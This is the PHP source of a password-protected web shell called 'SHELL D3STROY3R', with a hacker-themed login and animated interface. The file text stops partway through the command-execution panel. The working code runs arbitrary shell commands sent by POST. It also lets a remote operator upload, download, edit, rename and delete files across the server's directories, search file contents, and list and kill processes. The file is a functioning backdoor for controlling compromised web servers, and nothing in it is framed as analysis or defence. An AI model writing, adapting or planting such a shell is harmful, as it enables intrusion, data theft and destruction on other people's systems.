<?php
// ============================================================
// SHELL D3STROY3R - ULTIMATE EDITION v4.0 (SEARCH + PROCESSES)
// Password: d3s
// ============================================================
session_start();
$pass = 'd3s';

// --- FUNCTION: Transition page after successful login ---
function showTransitionPage() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>ACCESS GRANTED</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body, html { height:100%; overflow:hidden; background:#000; font-family:"Courier New",monospace; }
            #door-container {
                position:fixed;
                top:0;
                left:0;
                width:100%;
                height:100%;
                z-index:9999;
                display:flex;
                justify-content:center;
                align-items:center;
                background:#000;
                perspective:1200px;
            }
            .door-half {
                position:absolute;
                top:0;
                width:50%;
                height:100%;
                background:linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
                border:2px solid #00ff88;
                box-shadow:inset 0 0 60px #00ff8833, 0 0 40px #00ff8844;
                transition:transform 1.8s cubic-bezier(0.77, 0, 0.18, 1);
                display:flex;
                justify-content:center;
                align-items:center;
                font-size:60px;
                color:#00ff88;
                text-shadow:0 0 30px #00ff88;
                letter-spacing:10px;
                font-weight:bold;
                overflow:hidden;
            }
            .door-half::before {
                content:'';
                position:absolute;
                top:0;
                left:0;
                width:100%;
                height:100%;
                background:repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,136,0.03) 3px, rgba(0,255,136,0.03) 6px);
                pointer-events:none;
            }
            .door-left {
                left:0;
                transform-origin:left center;
                border-right:1px solid #00ff8866;
                transform:rotateY(0deg);
            }
            .door-right {
                right:0;
                transform-origin:right center;
                border-left:1px solid #00ff8866;
                transform:rotateY(0deg);
            }
            .door-left .text { margin-right:20px; }
            .door-right .text { margin-left:20px; }
            .door-left .text, .door-right .text {
                animation:glitchText 0.8s infinite alternate;
            }
            @keyframes glitchText {
                0% { text-shadow:0 0 10px #00ff88, 0 0 20px #00ff88, 0 0 40px #ff0044; }
                100% { text-shadow:0 0 20px #ff0044, 0 0 40px #ff0044, 0 0 80px #00ff88; }
            }
            .door-open .door-left {
                transform:rotateY(-85deg) translateX(-10%);
            }
            .door-open .door-right {
                transform:rotateY(85deg) translateX(10%);
            }
            #access-text {
                position:absolute;
                top:50%;
                left:50%;
                transform:translate(-50%,-50%);
                z-index:10000;
                color:#00ff88;
                font-size:80px;
                font-weight:bold;
                text-shadow:0 0 40px #00ff88, 0 0 80px #00ff8844;
                opacity:0;
                animation:fadeIn 1.5s ease forwards 1.2s;
                letter-spacing:12px;
                text-align:center;
            }
            #access-text span { color:#ff0044; text-shadow:0 0 40px #ff0044; }
            @keyframes fadeIn {
                0% { opacity:0; transform:translate(-50%,-50%) scale(0.5); }
                100% { opacity:1; transform:translate(-50%,-50%) scale(1); }
            }
            .glitch-overlay {
                position:fixed;
                top:0;
                left:0;
                width:100%;
                height:100%;
                z-index:9998;
                pointer-events:none;
                background:repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.02) 2px, rgba(0,255,136,0.02) 4px);
                mix-blend-mode:overlay;
                animation:scan 3s linear infinite;
            }
            @keyframes scan {
                0% { background-position:0 0; }
                100% { background-position:0 100%; }
            }
            .matrix-rain {
                position:fixed;
                top:0;
                left:0;
                width:100%;
                height:100%;
                z-index:9997;
                pointer-events:none;
                opacity:0.15;
                font-size:14px;
                color:#00ff88;
                font-family:monospace;
                overflow:hidden;
            }
            .matrix-rain div {
                position:absolute;
                top:0;
                white-space:nowrap;
                animation:fall linear infinite;
            }
            @keyframes fall {
                0% { transform:translateY(-100%); opacity:0; }
                10% { opacity:1; }
                90% { opacity:1; }
                100% { transform:translateY(100vh); opacity:0; }
            }
            @media (max-width:600px) {
                .door-half { font-size:30px; }
                #access-text { font-size:36px; letter-spacing:6px; }
            }
        </style>
    </head>
    <body>
        <div id="door-container" class="door-open">
            <div class="door-half door-left"><span class="text">⧫</span></div>
            <div class="door-half door-right"><span class="text">⧫</span></div>
            <div id="access-text">⟡ <span>ACCESS</span> GRANTED ⟡</div>
        </div>
        <div class="glitch-overlay"></div>
        <div class="matrix-rain" id="matrix"></div>

        <script>
            (function() {
                var container = document.getElementById('matrix');
                var columns = Math.floor(window.innerWidth / 20);
                var columnHeights = [];
                for (var i = 0; i < columns; i++) {
                    columnHeights.push(Math.floor(Math.random() * 100));
                }
                var chars = "0123456789ABCDEF";
                for (var i = 0; i < columns; i++) {
                    var div = document.createElement('div');
                    div.style.left = (i * 20) + 'px';
                    div.style.animationDuration = (5 + Math.random() * 10) + 's';
                    div.style.animationDelay = (Math.random() * 10) + 's';
                    var text = '';
                    for (var j = 0; j < 20; j++) {
                        text += chars.charAt(Math.floor(Math.random() * chars.length));
                    }
                    div.textContent = text;
                    container.appendChild(div);
                }
            })();

            setTimeout(function() {
                window.location.href = window.location.pathname;
            }, 3200);
        </script>
    </body>
    </html>
    <?php
    exit;
}

// --- LOGOUT ---
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// --- LOGIN CHECK ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pwd']) && $_POST['pwd'] === $pass) {
    $_SESSION['auth'] = true;
    showTransitionPage();
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    // --- LOGIN PAGE ---
    echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SHELL D3STROY3R - LOGIN</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        @keyframes glitch { 0%{text-shadow:0 0 10px #ff0044,0 0 20px #ff0044,0 0 40px #ff0044;} 50%{text-shadow:0 0 20px #00ff88,0 0 40px #00ff88,0 0 80px #00ff88;} 100%{text-shadow:0 0 10px #ff0044,0 0 20px #ff0044,0 0 40px #ff0044;} }
        @keyframes pulse { 0%{transform:scale(1); opacity:0.9;} 50%{transform:scale(1.02); opacity:1;} 100%{transform:scale(1); opacity:0.9;} }
        body, html { height:100%; overflow:hidden; font-family:"Courier New",monospace; background:#000; }
        #bg-video { position:fixed; top:0; left:0; min-width:100%; min-height:100%; object-fit:cover; z-index:0; filter:brightness(0.3) contrast(1.3) saturate(1.5); }
        .login-overlay { position:absolute; top:0; left:0; width:100%; height:100%; z-index:1; display:flex; justify-content:center; align-items:center; background:rgba(0,0,0,0.6); backdrop-filter:blur(8px); }
        .login-box { background:rgba(10,10,10,0.85); border:2px solid #00ff88; box-shadow:0 0 60px #00ff8866, inset 0 0 60px #00ff8822; padding:50px 60px; max-width:480px; width:100%; text-align:center; border-radius:20px; animation:pulse 3s infinite; }
        .login-box h1 { font-size:42px; font-weight:bold; color:#00ff88; animation:glitch 2s infinite; letter-spacing:6px; margin-bottom:10px; }
        .login-box h1 span { color:#ff0044; }
        .login-box .sub { color:#00ff88aa; font-size:14px; letter-spacing:4px; border-bottom:1px solid #00ff8844; padding-bottom:15px; margin-bottom:25px; }
        .login-box input[type="password"] { width:100%; padding:16px; background:#0a0a0a; border:2px solid #00ff88; color:#00ff88; font-size:18px; font-family:inherit; border-radius:10px; outline:none; transition:0.3s; text-align:center; letter-spacing:4px; }
        .login-box input[type="password"]:focus { border-color:#ff0044; box-shadow:0 0 30px #ff004466; }
        .login-box button { width:100%; padding:16px; margin-top:20px; background:#00ff8822; border:2px solid #00ff88; color:#00ff88; font-size:22px; font-family:inherit; border-radius:10px; cursor:pointer; transition:0.3s; letter-spacing:6px; text-transform:uppercase; }
        .login-box button:hover { background:#00ff8844; box-shadow:0 0 40px #00ff88; transform:scale(1.02); }
        .login-box .hint { color:#ff004488; font-size:12px; margin-top:15px; letter-spacing:2px; }
        .scanline { position:absolute; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.03) 2px, rgba(0,255,136,0.03) 4px); pointer-events:none; z-index:2; }
        .vignette { position:absolute; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at center, transparent 50%, #000000cc 100%); pointer-events:none; z-index:2; }
        #login-audio { display:none; }
        @media (max-width:600px){ .login-box{ padding:30px 20px; } .login-box h1{ font-size:28px; } }
    </style>
</head>
<body>
    <audio id="login-audio" autoplay loop>
        <source src="https://raw.githubusercontent.com/devopcoder/QR-GENERATOR-PBHNS/main/What%20if%20I%20miss%20you%20for%20the%20rest%20of%20my%20life.mp3" type="audio/mpeg">
    </audio>
    <video autoplay muted loop id="bg-video" playsinline>
        <source src="https://raw.githubusercontent.com/devopcoder/QR-GENERATOR-PBHNS/main/ssstik.io_1785234475347.mp4" type="video/mp4">
    </video>
    <div class="vignette"></div>
    <div class="scanline"></div>
    <div class="login-overlay">
        <div class="login-box">
            <h1>⚡<span>D3</span>STROY<span>3</span>R⚡</h1>
            <div class="sub">// ENTER THE MATRIX //</div>
            <form method="POST">
                <input type="password" name="pwd" placeholder="PASSWORD" autofocus>
                <button type="submit">⟡ UNLOCK ⟡</button>
            </form>
            <div class="hint">[ SYSTEM SECURE ]</div>
        </div>
    </div>
    <script>
        document.addEventListener("click", function() {
            var audio = document.getElementById("login-audio");
            if (audio.paused) {
                audio.play().catch(function(e) {});
            }
        });
    </script>
</body>
</html>';
    session_write_close();
    exit;
}
session_write_close();

// --- MAIN SHELL LOGIC ---
$base = isset($_GET['dir']) ? $_GET['dir'] : '.';
$base = realpath($base) ?: '.';
$files = scandir($base) ?: [];

// --- HANDLE ACTIONS ---
// Rename
if (isset($_GET['rename']) && isset($_GET['newname'])) {
    $old = $base . '/' . $_GET['rename'];
    $new = $base . '/' . $_GET['newname'];
    if (file_exists($old) && !file_exists($new)) {
        rename($old, $new);
    }
    header("Location: ?dir=" . urlencode($base));
    exit;
}

// Delete
if (isset($_GET['del'])) {
    $target = $base . '/' . $_GET['del'];
    if (file_exists($target)) {
        if (is_dir($target)) {
            @rmdir($target);
        } else {
            @unlink($target);
        }
    }
    header("Location: ?dir=" . urlencode($base));
    exit;
}

// Save edited file
if (isset($_POST['save_content']) && isset($_POST['filename'])) {
    $filepath = $base . '/' . $_POST['filename'];
    if (file_exists($filepath) && is_file($filepath)) {
        file_put_contents($filepath, $_POST['content']);
    }
    header("Location: ?dir=" . urlencode($base));
    exit;
}

// Upload
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $base . '/' . $_FILES['file']['name']);
    header("Location: ?dir=" . urlencode($base));
    exit;
}

// Command execution
$cmd_out = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmd_out = shell_exec($cmd . ' 2>&1');
}

// Download
if (isset($_GET['dl'])) {
    $file = $base . '/' . $_GET['dl'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// --- SEARCH HANDLER ---
$search_results = [];
if (isset($_GET['search'])) {
    $search_dir = isset($_GET['search_dir']) ? $_GET['search_dir'] : $base;
    $search_dir = realpath($search_dir) ?: $base;
    $pattern = isset($_GET['search_pattern']) ? trim($_GET['search_pattern']) : '';
    $content = isset($_GET['search_content']) ? trim($_GET['search_content']) : '';
    
    if (!empty($pattern) || !empty($content)) {
        // Build find command
        $find_cmd = "find " . escapeshellarg($search_dir) . " -type f ";
        if (!empty($pattern)) {
            $safe_pattern = preg_replace('/[^a-zA-Z0-9_\-\.*?]/', '', $pattern);
            $find_cmd .= "-iname \"*{$safe_pattern}*\" ";
        }
        $find_cmd .= "2>/dev/null";
        $output = shell_exec($find_cmd);
        $files_found = $output ? array_filter(explode("\n", $output)) : [];
        
        // If content search specified, filter by grep
        if (!empty($content) && !empty($files_found)) {
            $grep_cmd = "grep -l " . escapeshellarg($content) . " " . implode(" ", array_map('escapeshellarg', $files_found)) . " 2>/dev/null";
            $grep_out = shell_exec($grep_cmd);
            $files_found = $grep_out ? array_filter(explode("\n", $grep_out)) : [];
        }
        $search_results = array_slice($files_found, 0, 100);
    }
}

// --- PROCESS HANDLER ---
$processes = [];
if (isset($_GET['kill_pid'])) {
    $pid = intval($_GET['kill_pid']);
    if ($pid > 0) {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            exec("taskkill /PID $pid /F 2>nul");
        } else {
            exec("kill -9 $pid 2>/dev/null");
        }
    }
    // Refresh after kill, keep dir
    header("Location: ?dir=" . urlencode($base) . "&proc_refresh=1");
    exit;
}

// Always fetch processes unless refresh flag is set (just to avoid unnecessary load, but we fetch anyway)
if (!isset($_GET['proc_refresh']) || $_GET['proc_refresh'] == '1') {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $cmd = 'tasklist /FO CSV /NH';
        $out = shell_exec($cmd);
        if ($out) {
            $lines = explode("\n", $out);
            foreach ($lines as $line) {
                $line = trim($line, " \t\n\r\0\x0B,");
                if (empty($line)) continue;
                $parts = str_getcsv($line);
                if (count($parts) >= 2) {
                    $name = $parts[0] ?? 'unknown';
                    $pid = intval($parts[1] ?? 0);
                    $mem = isset($parts[4]) ? intval($parts[4]) / 1024 : 0; // KB -> MB
                    $processes[] = ['pid' => $pid, 'name' => $name, 'cpu' => 0, 'mem' => $mem];
                }
            }
        }
    } else {
        $cmd = 'ps -eo pid,comm,pcpu,pmem --sort=-pcpu | head -50';
        $out = shell_exec($cmd);
        if ($out) {
            $lines = explode("\n", $out);
            array_shift($lines); // skip header
            foreach ($lines as $line) {
                $line = trim($line);
                if (empty($line)) continue;
                $parts = preg_split('/\s+/', $line);
                if (count($parts) >= 4) {
                    $pid = intval($parts[0]);
                    $name = $parts[1];
                    $cpu = floatval($parts[2]);
                    $mem = floatval($parts[3]);
                    $processes[] = ['pid' => $pid, 'name' => $name, 'cpu' => $cpu, 'mem' => $mem];
                }
            }
        }
    }
}

// --- EDIT MODE ---
if (isset($_GET['edit'])) {
    $edit_file = $base . '/' . $_GET['edit'];
    $content = '';
    if (file_exists($edit_file) && is_file($edit_file)) {
        $content = file_get_contents($edit_file);
    } else {
        $content = "// File not found or is a directory";
    }
    ?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SHELL D3STROY3R - EDIT</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { height:100%; background:#000; font-family:"Courier New",monospace; overflow:hidden; }
        #bg-video { position:fixed; top:0; left:0; min-width:100%; min-height:100%; object-fit:cover; z-index:0; filter:brightness(0.25) contrast(1.4) saturate(1.6); }
        .vignette { position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at center, transparent 40%, #000000dd 100%); z-index:1; pointer-events:none; }
        .scanline { position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,136,0.04) 3px, rgba(0,255,136,0.04) 6px); pointer-events:none; z-index:2; }
        .container { position:relative; z-index:4; max-width:1200px; margin:0 auto; padding:20px; height:100vh; overflow-y:auto; color:#00ff88; }
        .container::-webkit-scrollbar { width:6px; }
        .container::-webkit-scrollbar-track { background:#0a0a0a; }
        .container::-webkit-scrollbar-thumb { background:#00ff88; }
        .box { background:rgba(10,10,10,0.75); backdrop-filter:blur(12px); border:1px solid #00ff8866; border-radius:16px; padding:20px; margin-bottom:20px; }
        .box h2 { font-size:18px; letter-spacing:4px; border-bottom:1px dashed #00ff8844; padding-bottom:10px; margin-bottom:16px; }
        textarea { width:100%; height:60vh; background:#0a0a0a; border:1px solid #00ff8866; color:#00ff88; padding:12px; font-family:inherit; font-size:14px; border-radius:8px; resize:vertical; }
        textarea:focus { border-color:#ff0044; box-shadow:0 0 30px #ff004466; outline:none; }
        .actions { display:flex; gap:20px; flex-wrap:wrap; margin-top:12px; }
        button { background:#00ff8822; color:#00ff88; border:1px solid #00ff88; padding:10px 24px; border-radius:8px; cursor:pointer; font-family:inherit; font-size:16px; transition:0.3s; }
        button:hover { background:#00ff8844; box-shadow:0 0 40px #00ff88; }
        .back-link { color:#ffaa00; text-decoration:none; border:1px solid #ffaa0066; padding:10px 24px; border-radius:8px; transition:0.3s; }
        .back-link:hover { background:#ffaa0022; box-shadow:0 0 30px #ffaa00; }
    </style>
</head>
<body>
    <video autoplay muted loop id="bg-video" playsinline>
        <source src="https://raw.githubusercontent.com/devopcoder/QR-GENERATOR-PBHNS/main/ssstik.io_1785234454234.mp4" type="video/mp4">
    </video>
    <div class="vignette"></div>
    <div class="scanline"></div>
    <div class="container">
        <div class="box">
            <h2>✎ EDIT: <?php echo htmlspecialchars($_GET['edit']); ?></h2>
            <form method="POST">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
                <div class="actions">
                    <button type="submit" name="save_content">💾 SAVE</button>
                    <a href="?dir=<?php echo urlencode($base); ?>" class="back-link">⬅ BACK</a>
                </div>
            </form>
        </div>
    </div>
</body>
</html><?php
    exit;
}

// --- MAIN SHELL UI WITH SEARCH & PROCESSES ---
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SHELL D3STROY3R</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        @keyframes glitchText { 0%{text-shadow:0 0 10px #00ff88,0 0 20px #00ff88,0 0 40px #ff0044;} 50%{text-shadow:0 0 20px #ff0044,0 0 40px #ff0044,0 0 80px #00ff88;} 100%{text-shadow:0 0 10px #00ff88,0 0 20px #00ff88,0 0 40px #ff0044;} }
        @keyframes scan { 0%{top:-100%;} 100%{top:200%;} }
        @keyframes floatGlow { 0%{filter:drop-shadow(0 0 5px #00ff88);} 50%{filter:drop-shadow(0 0 25px #00ff88) drop-shadow(0 0 50px #ff004488);} 100%{filter:drop-shadow(0 0 5px #00ff88);} }
        body, html { height:100%; background:#000; font-family:"Courier New",monospace; overflow:hidden; }
        #bg-video { position:fixed; top:0; left:0; min-width:100%; min-height:100%; object-fit:cover; z-index:0; filter:brightness(0.25) contrast(1.4) saturate(1.6); }
        .vignette { position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at center, transparent 40%, #000000dd 100%); z-index:1; pointer-events:none; }
        .scanline { position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,136,0.04) 3px, rgba(0,255,136,0.04) 6px); pointer-events:none; z-index:2; }
        .scan-beam { position:fixed; left:0; width:100%; height:6px; background:linear-gradient(90deg, transparent, #00ff8844, #00ff88, #00ff8844, transparent); z-index:3; pointer-events:none; animation:scan 6s linear infinite; opacity:0.3; }
        .container { position:relative; z-index:4; max-width:1400px; margin:0 auto; padding:20px; height:100vh; overflow-y:auto; color:#00ff88; text-shadow:0 0 10px #00ff8844; }
        .container::-webkit-scrollbar { width:6px; }
        .container::-webkit-scrollbar-track { background:#0a0a0a; }
        .container::-webkit-scrollbar-thumb { background:#00ff88; box-shadow:0 0 20px #00ff88; }
        .header { display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #00ff88; padding-bottom:12px; margin-bottom:20px; flex-wrap:wrap; gap:10px; }
        .header h1 { font-size:34px; animation:glitchText 2.5s infinite; letter-spacing:8px; }
        .header h1 span { color:#ff0044; text-shadow:0 0 20px #ff0044; }
        .header .right { display:flex; align-items:center; gap:20px; flex-wrap:wrap; }
        .header .pwd-info { color:#ffaa00; font-size:14px; background:#0a0a0a88; padding:8px 18px; border:1px solid #ffaa0066; border-radius:30px; backdrop-filter:blur(4px); }
        .logout-btn { color:#ff0044; background:#0a0a0a88; padding:8px 18px; border:1px solid #ff004466; border-radius:30px; text-decoration:none; font-size:14px; transition:0.3s; backdrop-filter:blur(4px); }
        .logout-btn:hover { background:#ff004422; box-shadow:0 0 30px #ff0044; border-color:#ff0044; }
        .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-bottom:20px; }
        .box { background:rgba(10,10,10,0.75); backdrop-filter:blur(12px); border:1px solid #00ff8866; border-radius:16px; padding:18px; box-shadow:0 0 40px #00ff8822; transition:0.3s; }
        .box:hover { border-color:#00ff88; box-shadow:0 0 60px #00ff8844; }
        .box h2 { font-size:16px; text-transform:uppercase; letter-spacing:4px; border-bottom:1px dashed #00ff8844; padding-bottom:8px; margin-bottom:14px; color:#00ff88aa; }
        .box-full { grid-column:1 / -1; }
        input, select, button, textarea { background:rgba(0,0,0,0.7); color:#00ff88; border:1px solid #00ff8866; padding:10px 14px; font-family:inherit; border-radius:8px; margin:4px 0; width:100%; transition:0.3s; backdrop-filter:blur(4px); }
        input:focus, select:focus, textarea:focus { border-color:#ff0044; box-shadow:0 0 30px #ff004466; outline:none; }
        button { background:#00ff8822; cursor:pointer; width:auto; padding:10px 28px; letter-spacing:2px; text-transform:uppercase; border-color:#00ff88; }
        button:hover { background:#00ff8844; box-shadow:0 0 40px #00ff88; transform:scale(1.02); }
        textarea { height:180px; resize:vertical; }
        .file-list { list-style:none; max-height:300px; overflow-y:auto; }
        .file-list li { padding:6px 0; border-bottom:1px solid #00ff8822; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px; }
        .file-list .file-info { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
        .file-list .file-info a { color:#00ff88; text-decoration:none; transition:0.2s; }
        .file-list .file-info a:hover { text-shadow:0 0 20px #00ff88; }
        .file-list .dir { color:#ffaa00; }
        .file-list .dir:hover { text-shadow:0 0 20px #ffaa00; }
        .file-list .size { color:#888; font-size:11px; }
        .file-actions { display:flex; gap:8px; flex-wrap:wrap; }
        .file-actions a { color:#00ff88aa; text-decoration:none; font-size:12px; padding:2px 8px; border:1px solid #00ff8833; border-radius:4px; transition:0.3s; }
        .file-actions a:hover { background:#00ff8822; border-color:#00ff88; text-shadow:0 0 10px #00ff88; }
        .file-actions .del { color:#ff0044; border-color:#ff004466; }
        .file-actions .del:hover { background:#ff004422; border-color:#ff0044; text-shadow:0 0 10px #ff0044; }
        .cmd-out { background:#000000cc; border:1px solid #00ff8844; padding:12px; border-radius:8px; white-space:pre-wrap; word-break:break-all; max-height:300px; overflow:auto; font-size:13px; backdrop-filter:blur(4px); }
        .footer { margin-top:20px; text-align:right; color:#00ff8866; font-size:11px; letter-spacing:2px; border-top:1px solid #00ff8822; padding-top:14px; }
        .upload-row { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
        .upload-row input[type="file"] { flex:1; min-width:200px; }
        .upload-row button { flex-shrink:0; }
        #main-audio { display:none; }
        #d3s-logo {
            position:fixed;
            top:20px;
            right:20px;
            z-index:999;
            width:80px;
            height:80px;
            border-radius:50%;
            border:2px solid #00ff88;
            box-shadow:0 0 30px #00ff8866, inset 0 0 20px #00ff8844;
            animation: floatGlow 3s infinite alternate;
            transition:0.3s;
            object-fit:cover;
            background:#0a0a0a;
            padding:3px;
        }
        #d3s-logo:hover {
            transform:scale(1.1) rotate(-5deg);
            border-color:#ff0044;
            box-shadow:0 0 50px #ff004466, inset 0 0 30px #ff004444;
        }
        .search-results { max-height:200px; overflow-y:auto; font-size:13px; }
        .search-results a { color:#00ff88; text-decoration:none; display:block; padding:2px 0; border-bottom:1px solid #00ff8822; }
        .search-results a:hover { background:#00ff8811; text-shadow:0 0 10px #00ff88; }
        .proc-table { width:100%; border-collapse:collapse; font-size:12px; }
        .proc-table th { text-align:left; border-bottom:1px solid #00ff88; padding:4px; color:#ffaa00; }
        .proc-table td { padding:4px; border-bottom:1px solid #00ff8822; }
        .proc-table .kill-btn { color:#ff0044; background:transparent; border:1px solid #ff004466; padding:2px 10px; border-radius:4px; cursor:pointer; font-size:11px; }
        .proc-table .kill-btn:hover { background:#ff004422; box-shadow:0 0 20px #ff0044; }
        .cpu-high { color:#ff0044; }
        .cpu-med { color:#ffaa00; }
        .proc-scroll { max-height:220px; overflow-y:auto; }
        @media (max-width:800px){ .grid{ grid-template-columns:1fr; } .header h1{ font-size:24px; } }
        @media (max-width:600px){ #d3s-logo { width:60px; height:60px; top:10px; right:10px; } }
        .glow-text { animation:glowText 1.8s infinite alternate; }
        @keyframes glowText { 0%{text-shadow:0 0 5px #00ff88;} 100%{text-shadow:0 0 30px #00ff88,0 0 60px #00ff8844;} }
    </style>
</head>
<body>
    <audio id="main-audio" autoplay loop>
        <source src="https://raw.githubusercontent.com/devopcoder/QR-GENERATOR-PBHNS/main/the%20archer.mp3" type="audio/mpeg">
    </audio>
    <video autoplay muted loop id="bg-video" playsinline>
        <source src="https://raw.githubusercontent.com/devopcoder/QR-GENERATOR-PBHNS/main/ssstik.io_1785234454234.mp4" type="video/mp4">
    </video>
    <div class="vignette"></div>
    <div class="scanline"></div>
    <div class="scan-beam"></div>

    <img id="d3s-logo" src="https://raw.githubusercontent.com/devopcoder/PFO/main/ChatGPT%20Image%20May%2015%2C%202026%2C%2006_31_01%20AM.png" alt="D3S" title="D3S - The Creator" onerror="this.style.display='none';">

    <div class="container">
        <div class="header">
            <h1>⚡<span>D3</span>STROY<span>3</span>R⚡</h1>
            <div class="right">
                <div class="pwd-info">📁 <?php echo htmlspecialchars($base); ?></div>
                <a href="?logout=1" class="logout-btn">⏻ LOGOUT</a>
            </div>
        </div>

        <!-- Grid: File Manager & Upload -->
        <div class="grid">
            <div class="box">
                <h2>📂 FILE MANAGER</h2>
                <ul class="file-list">
                <?php foreach ($files as $f): ?>
                    <?php if ($f === '.' || $f === '..') continue; ?>
                    <li>
                        <span class="file-info">
                        <?php if (is_dir($base.'/'.$f)): ?>
                            <a class="dir" href="?dir=<?php echo urlencode($base.'/'.$f); ?>">📁 <?php echo htmlspecialchars($f); ?></a>
                        <?php else: ?>
                            <a href="?dl=<?php echo urlencode($f); ?>&dir=<?php echo urlencode($base); ?>">📄 <?php echo htmlspecialchars($f); ?></a>
                            <span class="size"><?php echo filesize($base.'/'.$f); ?> B</span>
                        <?php endif; ?>
                        </span>
                        <span class="file-actions">
                            <?php if (!is_dir($base.'/'.$f)): ?>
                                <a href="?edit=<?php echo urlencode($f); ?>&dir=<?php echo urlencode($base); ?>">✎</a>
                            <?php endif; ?>
                            <a href="#" onclick="var newname=prompt('New name for <?php echo htmlspecialchars($f); ?>?'); if(newname) location.href='?rename=<?php echo urlencode($f); ?>&newname='+encodeURIComponent(newname)+'&dir=<?php echo urlencode($base); ?>'; return false;">✏️</a>
                            <a class="del" href="?del=<?php echo urlencode($f); ?>&dir=<?php echo urlencode($base); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($f); ?>?');">✕</a>
                        </span>
                    </li>
                <?php endforeach; ?>
                </ul>
                <?php if (realpath($base.'/..') !== false): ?>
                    <a href="?dir=<?php echo urlencode(realpath($base.'/..')); ?>" style="color:#ffaa00;display:inline-block;margin-top:10px;">⬆ UP</a>
                <?php endif; ?>
            </div>

            <div class="box">
                <h2>📤 UPLOAD</h2>
                <form method="POST" enctype="multipart/form-data" class="upload-row">
                    <input type="file" name="file" required>
                    <button type="submit">⬆ UPLOAD</button>
                </form>
            </div>
        </div>

        <!-- New Grid: SEARCH & PROCESSES -->
        <div class="grid">
            <!-- Search Panel -->
            <div class="box">
                <h2>🔍 SEARCH</h2>
                <form method="GET" action="">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($base); ?>">
                    <input type="text" name="search_dir" placeholder="Directory (default current)" value="<?php echo isset($_GET['search_dir']) ? htmlspecialchars($_GET['search_dir']) : $base; ?>">
                    <input type="text" name="search_pattern" placeholder="Filename pattern" value="<?php echo isset($_GET['search_pattern']) ? htmlspecialchars($_GET['search_pattern']) : ''; ?>">
                    <input type="text" name="search_content" placeholder="Content (grep)" value="<?php echo isset($_GET['search_content']) ? htmlspecialchars($_GET['search_content']) : ''; ?>">
                    <button type="submit" name="search" value="1">▶ SEARCH</button>
                </form>
                <?php if (isset($_GET['search']) && !empty($search_results)): ?>
                    <div class="search-results">
                        <?php foreach ($search_results as $filepath): ?>
                            <?php $dir = dirname($filepath); $fname = basename($filepath); ?>
                            <a href="?dir=<?php echo urlencode($dir); ?>&highlight=<?php echo urlencode($fname); ?>">📄 <?php echo htmlspecialchars($filepath); ?></a>
                        <?php endforeach; ?>
                    </div>
                <?php elseif (isset($_GET['search'])): ?>
                    <div style="color:#ffaa00; margin-top:10px;">No files found.</div>
                <?php endif; ?>
            </div>

            <!-- Processes Panel -->
            <div class="box">
                <h2>⚙️ PROCESSES</h2>
                <div style="display:flex; gap:10px; margin-bottom:8px;">
                    <a href="?dir=<?php echo urlencode($base); ?>&proc_refresh=1" style="color:#00ff88; text-decoration:none; border:1px solid #00ff8866; padding:4px 12px; border-radius:4px;">⟳ REFRESH</a>
                </div>
                <div class="proc-scroll">
                    <table class="proc-table">
                        <thead><tr><th>PID</th><th>COMMAND</th><th>CPU%</th><th>MEM%</th><th>ACTION</th></tr></thead>
                        <tbody>
                        <?php if (empty($processes)): ?>
                            <tr><td colspan="5" style="color:#888;">No processes or cannot read.</td></tr>
                        <?php else: ?>
                            <?php foreach ($processes as $proc): ?>
                                <tr>
                                    <td><?php echo $proc['pid']; ?></td>
                                    <td><?php echo htmlspecialchars($proc['name']); ?></td>
                                    <td class="<?php echo ($proc['cpu'] > 50) ? 'cpu-high' : (($proc['cpu'] > 20) ? 'cpu-med' : ''); ?>"><?php echo number_format($proc['cpu'], 1); ?></td>
                                    <td><?php echo number_format($proc['mem'], 1); ?></td>
                                    <td><a href="?kill_pid=<?php echo $proc['pid']; ?>&dir=<?php echo urlencode($base); ?>" class="kill-btn" onclick="return confirm('Kill PID <?php echo $proc['pid']; ?>?');">✕ KILL</a></td>
                                </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Command Execution -->
        <div class="box box-full" style="margin-bottom:20px;">
            <h2>💻 COMMAND EXECUTION</h2>
